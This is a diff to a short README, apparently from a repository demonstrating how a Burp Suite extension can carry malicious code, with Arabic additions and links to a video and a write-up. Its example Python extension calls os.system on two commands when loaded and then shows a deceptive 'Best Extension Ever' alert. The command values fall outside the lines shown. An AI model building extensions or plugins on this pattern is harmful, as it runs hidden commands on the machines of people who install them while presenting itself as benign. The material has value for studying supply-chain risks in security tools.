@@ -1,13 +1,14 @@
 # BurpSuite-Extension-inject
 burp suite extensions inject Malicious code ( Example )
 
+شرح فيديو 
 Watch Video on youtube 
 https://youtu.be/drqN1bk8ZlA
 
 
 Example Code :
-
-from burp import IBurpExtender 
+   ```sh
+   from burp import IBurpExtender 
 import os 
 
 class BurpExtender(IBurpExtender):
@@ -21,6 +22,10 @@ class BurpExtender(IBurpExtender):
      os.system(cmd)
      os.system(cmd2)
      callbacks.issueAlert("Best Extension Ever | Or4nG.M4n | @interestedz")
-     
-     
-     Goodluck ^_^
+   ```
+   
+   شرح يهمك من 0xhunter
+   https://0xhunter.me/read?id=57
+   
+       <^_^>
+ Goodluck
